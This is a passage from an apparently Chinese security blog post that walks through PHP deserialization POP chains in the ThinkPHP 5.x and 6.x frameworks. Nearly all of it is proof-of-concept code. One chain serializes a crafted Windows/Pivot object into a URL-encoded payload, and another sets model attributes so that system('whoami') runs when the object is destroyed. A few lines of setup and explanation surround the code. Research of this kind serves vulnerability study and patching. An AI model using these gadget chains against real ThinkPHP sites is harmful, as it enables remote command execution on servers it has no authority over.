class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$fieldName</span>];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRealFieldName</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;strict ? <span class="variable">$name</span> : <span class="title class_">App</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">trait</span> <span class="title">RelationShip</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$relation</span> = [];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">        <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title class_">use</span> <span class="title class_">model</span>\<span class="title class_">concern</span>\<span class="title class_">Attribute</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> &#123;</span><br><span class="line">        $<span class="title class_">conversion</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>();</span><br><span class="line">        <span class="comment">//$conversion-&gt;__toString();</span></span><br><span class="line">        <span class="variable">$windows</span> = <span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>();</span><br><span class="line">        <span class="variable">$windows</span>-&gt;<span class="title function_ invoke__">setFile</span>(<span class="variable">$conversion</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$windows</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="ThinkPHP6-X">ThinkPHP6.X</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=6.0.x-dev tp6x</span><br><span class="line"><span class="built_in">cd</span> tp6x</span><br><span class="line">./think run</span><br></pre></td></tr></table></figure>
<p>ThinkPHP6.x 的代码移除了 think\process\pipes\Windows 类，但POP链__toString 之后的 Gadget 仍然存在，所以再找一个可触发__toString的点即可。</p>
<p>vendor/topthink/think-orm/src/Model.php<br>
<img src="./1571212486705.png" alt="Alt text"></p>
<p><img src="./1571212527060.png" alt="Alt text"></p>
<p><img src="./1571212461170.png" alt="Alt text"></p>
<p><img src="./1571212571282.png" alt="Alt text"></p>
<p><img src="./1571212618925.png" alt="Alt text"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">        <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">            <span class="title class_">use</span> <span class="title class_">model</span>\<span class="title class_">concern</span>\<span class="title class_">ModelEvent</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$lazySave</span> = True;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$exists</span> = True;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$force</span> = True;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$table</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$suffix</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="keyword">string</span> <span class="variable">$sequence</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>() || <span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;exists ? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateData</span>() : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insertData</span>(<span class="variable">$sequence</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="comment">// 事件回调</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeUpdate&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="comment">//$this-&gt;checkData();</span></span><br><span class="line">        </span><br><span class="line">                <span class="comment">// 获取有更新的数据</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getChangedData</span>();</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 关联更新</span></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoRelationUpdate</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="variable language_">$this</span>-&gt;updateTime &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable language_">$this</span>-&gt;updateTime])) &#123;</span><br><span class="line">                    <span class="comment">// 自动写入更新时间</span></span><br><span class="line">                    <span class="variable">$data</span>[<span class="variable language_">$this</span>-&gt;updateTime]       = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoWriteTimestamp</span>(<span class="variable">$this</span>-&gt;updateTime);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;updateTime] = <span class="variable">$data</span>[<span class="variable language_">$this</span>-&gt;updateTime];</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="comment">// 检查允许字段</span></span><br><span class="line">                <span class="variable">$allowFields</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkAllowFields</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;field)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;schema)) &#123;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;field = <span class="title function_ invoke__">array_keys</span>(<span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;schema, <span class="variable">$this</span>-&gt;jsonType));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">//$query = $this-&gt;db();</span></span><br><span class="line">                        <span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;table ? <span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix : <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">getTable</span>();</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;field = <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">getConnection</span>()-&gt;<span class="title function_ invoke__">getTableFields</span>(<span class="variable">$table</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;field;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setTable</span>(<span class="params"><span class="variable">$table</span></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;table = <span class="variable">$table</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>&#123;</span><br><span class="line">        <span class="title class_">trait</span> <span class="title class_">Attribute</span>&#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">strict</span> = <span class="title class_">true</span>;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&#x27;key&#x27;</span> =&gt; <span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&#x27;key&#x27;</span> =&gt; <span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$field</span> = [];</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$schema</span> = [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;force ? <span class="variable language_">$this</span>-&gt;data : <span class="title function_ invoke__">array_udiff_assoc</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;origin, function (<span class="variable">$a</span>, <span class="variable">$b</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>)) &amp;&amp; <span class="variable">$a</span> !== <span class="variable">$b</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_ invoke__">is_object</span>(<span class="variable">$a</span>) || <span class="variable">$a</span> != <span class="variable">$b</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">                &#125;);</span><br><span class="line">        </span><br><span class="line">                <span class="comment">// 只读字段不允许更新</span></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="keyword">readonly</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$field</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$field</span>])) &#123;</span><br><span class="line">                        <span class="keyword">unset</span>(<span class="variable">$data</span>[<span class="variable">$field</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="variable">$value</span>, <span class="keyword">bool</span> <span class="variable">$relation</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="comment">// 检测属性获取器</span></span><br><span class="line">                <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line">                <span class="comment">//$method    = &#x27;get&#x27; . App::parseName($name, 1) . &#x27;Attr&#x27;;</span></span><br><span class="line">        </span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationValue</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="variable">$closure</span> = <span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>];</span><br><span class="line">                    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$closure</span>, <span class="variable">$value</span>);</span><br><span class="line">                    <span class="variable">$value</span>   = <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$method</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationValue</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$method</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;type[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">                    <span class="comment">// 类型转换</span></span><br><span class="line">                    <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readTransform</span>(<span class="variable">$value</span>, <span class="variable">$this</span>-&gt;type[<span class="variable">$fieldName</span>]);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$fieldName</span>, [<span class="variable">$this</span>-&gt;createTime, <span class="variable">$this</span>-&gt;updateTime])) &#123;</span><br><span class="line">                    <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getTimestampValue</span>(<span class="variable">$value</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                    <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationAttribute</span>(<span class="variable">$name</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="literal">false</span>;</span><br><span class="line">                    <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getValue</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$fieldName</span>];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRealFieldName</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;strict ? <span class="variable">$name</span> : <span class="title class_">App</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">trait</span> <span class="title">ModelEvent</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">trait</span> <span class="title">TimeStamp</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$autoWriteTimestamp</span> = False;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">trait</span> <span class="title">RelationShip</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$relation</span> = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$visable</span> = [<span class="string">&#x27;key&#x27;</span> =&gt; <span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">                  </span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="variable">$item</span>       = [];</span><br><span class="line">                <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)      = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                            <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                            <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;hidden <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)     = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                            <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 合并关联数据</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                        <span class="comment">// 关联模型对象</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                            <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">                        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                            <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">hidden</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 关联模型对象</span></span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    